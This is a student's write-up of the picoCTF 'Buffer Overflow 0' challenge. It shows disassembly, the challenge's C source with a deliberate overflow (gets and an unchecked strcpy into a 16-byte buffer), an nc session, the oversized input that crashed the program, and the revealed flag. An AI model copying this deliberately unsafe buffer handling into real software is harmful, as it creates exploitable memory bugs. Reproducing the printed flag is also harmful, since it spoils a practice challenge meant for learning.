# Binary_Exploitation
## Challenge 1: Buffer Overflow 0
Binary Exploitation

## Challenge 1: Buffer Overflow 0
I started off by checking the file details of the source and program files as I wasn’t sure of how to begin. 
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % file vuln.c
vuln.c: c program text, ASCII text

Then I viewed the assembly code
```
(lldb) target create vuln
Current executable set to '/Users/mahikakapil/cryptonite_tp2_Mahika/vuln' (i386).
(lldb) disassemble -n main
vuln`main:
vuln[0x1382] <+0>:   endbr32 
vuln[0x1386] <+4>:   leal   0x4(%esp), %ecx
vuln[0x138a] <+8>:   andl   $-0x10, %esp
vuln[0x138d] <+11>:  pushl  -0x4(%ecx)
vuln[0x1390] <+14>:  pushl  %ebp
vuln[0x1391] <+15>:  movl   %esp, %ebp
vuln[0x1393] <+17>:  pushl  %ebx
vuln[0x1394] <+18>:  pushl  %ecx
vuln[0x1395] <+19>:  subl   $0x70, %esp
vuln[0x1398] <+22>:  calll  0x1210                    ; __x86.get_pc_thunk.bx
vuln[0x139d] <+27>:  addl   $0x2c0f, %ebx             ; imm = 0x2C0F 
vuln[0x13a3] <+33>:  subl   $0x8, %esp
vuln[0x13a6] <+36>:  leal   -0x1fa4(%ebx), %eax
vuln[0x13ac] <+42>:  pushl  %eax
vuln[0x13ad] <+43>:  leal   -0x1fa2(%ebx), %eax
vuln[0x13b3] <+49>:  pushl  %eax
vuln[0x13b4] <+50>:  calll  0x11b0                    ;  + 160
vuln[0x13b9] <+55>:  addl   $0x10, %esp
vuln[0x13bc] <+58>:  movl   %eax, -0xc(%ebp)
vuln[0x13bf] <+61>:  cmpl   $0x0, -0xc(%ebp)
vuln[0x13c3] <+65>:  jne    0x13ef                    ; <+109>
vuln[0x13c5] <+67>:  subl   $0x4, %esp
vuln[0x13c8] <+70>:  leal   -0x1f99(%ebx), %eax
vuln[0x13ce] <+76>:  pushl  %eax
vuln[0x13cf] <+77>:  leal   -0x1f84(%ebx), %eax
vuln[0x13d5] <+83>:  pushl  %eax
vuln[0x13d6] <+84>:  leal   -0x1f4f(%ebx), %eax
vuln[0x13dc] <+90>:  pushl  %eax
vuln[0x13dd] <+91>:  calll  0x1110
vuln[0x13e2] <+96>:  addl   $0x10, %esp
vuln[0x13e5] <+99>:  subl   $0xc, %esp
vuln[0x13e8] <+102>: pushl  $0x0
vuln[0x13ea] <+104>: calll  0x1190                    ;  + 128
vuln[0x13ef] <+109>: subl   $0x4, %esp
vuln[0x13f2] <+112>: pushl  -0xc(%ebp)
vuln[0x13f5] <+115>: pushl  $0x40
vuln[0x13f7] <+117>: leal   0x94(%ebx), %eax
vuln[0x13fd] <+123>: pushl  %eax
vuln[0x13fe] <+124>: calll  0x1140                    ;  + 48
vuln[0x1403] <+129>: addl   $0x10, %esp
vuln[0x1406] <+132>: subl   $0x8, %esp
vuln[0x1409] <+135>: leal   -0x2c9f(%ebx), %eax
vuln[0x140f] <+141>: pushl  %eax
vuln[0x1410] <+142>: pushl  $0xb
vuln[0x1412] <+144>: calll  0x1150                    ;  + 64
vuln[0x1417] <+149>: addl   $0x10, %esp
vuln[0x141a] <+152>: calll  0x1160                    ;  + 80
vuln[0x141f] <+157>: movl   %eax, -0x10(%ebp)
vuln[0x1422] <+160>: subl   $0x4, %esp
vuln[0x1425] <+163>: pushl  -0x10(%ebp)
vuln[0x1428] <+166>: pushl  -0x10(%ebp)
vuln[0x142b] <+169>: pushl  -0x10(%ebp)
vuln[0x142e] <+172>: calll  0x11c0                    ;  + 176
vuln[0x1433] <+177>: addl   $0x10, %esp
vuln[0x1436] <+180>: subl   $0xc, %esp
vuln[0x1439] <+183>: leal   -0x1f49(%ebx), %eax
vuln[0x143f] <+189>: pushl  %eax
vuln[0x1440] <+190>: calll  0x1110
vuln[0x1445] <+195>: addl   $0x10, %esp
vuln[0x1448] <+198>: movl   0x48(%ebx), %eax
vuln[0x144e] <+204>: movl   (%eax), %eax
vuln[0x1450] <+206>: subl   $0xc, %esp
vuln[0x1453] <+209>: pushl  %eax
vuln[0x1454] <+210>: calll  0x1120                    ;  + 16
vuln[0x1459] <+215>: addl   $0x10, %esp
vuln[0x145c] <+218>: subl   $0xc, %esp
vuln[0x145f] <+221>: leal   -0x74(%ebp), %eax
vuln[0x1462] <+224>: pushl  %eax
vuln[0x1463] <+225>: calll  0x1130                    ;  + 32
vuln[0x1468] <+230>: addl   $0x10, %esp
vuln[0x146b] <+233>: subl   $0xc, %esp
vuln[0x146e] <+236>: leal   -0x74(%ebp), %eax
vuln[0x1471] <+239>: pushl  %eax
vuln[0x1472] <+240>: calll  0x1353                    ; vuln
vuln[0x1477] <+245>: addl   $0x10, %esp
vuln[0x147a] <+248>: subl   $0xc, %esp
vuln[0x147d] <+251>: leal   -0x1f41(%ebx), %eax
vuln[0x1483] <+257>: pushl  %eax
vuln[0x1484] <+258>: calll  0x1180                    ;  + 112
vuln[0x1489] <+263>: addl   $0x10, %esp
vuln[0x148c] <+266>: movl   $0x0, %eax
vuln[0x1491] <+271>: leal   -0x8(%ebp), %esp
vuln[0x1494] <+274>: popl   %ecx
vuln[0x1495] <+275>: popl   %ebx
vuln[0x1496] <+276>: popl   %ebp
vuln[0x1497] <+277>: leal   -0x4(%ecx), %esp
vuln[0x149a] <+280>: retl   
```
I also tried connecting to the program using the `nc saturn.picoctf.net 53460` which gave a prompt for input and then exited. 

mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 53460
Input: hello
The program will exit now

Then I decided to analyze the program.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```
Here, the function vuln takes an input in the array buf2 of maximum 16 characters. So I inputted more than 16 random characters and got the flag by overflowing the buffer. The assembly code didn’t really come in use here.
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 54932
Input: djakcnjIJSDCAJCJNDJLdjnjljcjhdhafhijldadefrefdsfghytrf
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


>Errors and mistakes:
1. I ran the command `lldb vuln.c ` but this resulted in the following error:
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % lldb vuln.c     
(lldb) target create "vuln.c"
error: '/Users/mahikakapil/cryptonite_tp2_Mahika/vuln.c' doesn't contain any 'host' platform architectures: arm64, armv7, armv7f, armv7k, armv7s, armv7m, armv7em, armv6m, armv6, armv5, armv4, arm, thumbv7, thumbv7k, thumbv7s, thumbv7f, thumbv7m, thumbv7em, thumbv6m, thumbv6, thumbv5, thumbv4t, thumb, x86_64, x86_64, arm64, arm64e, arm64, arm64e
``` 
I had to use the source code file instead as it was an ELF file. Later, I realized that this challenge could be done without the assembly code.

FLAG: picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
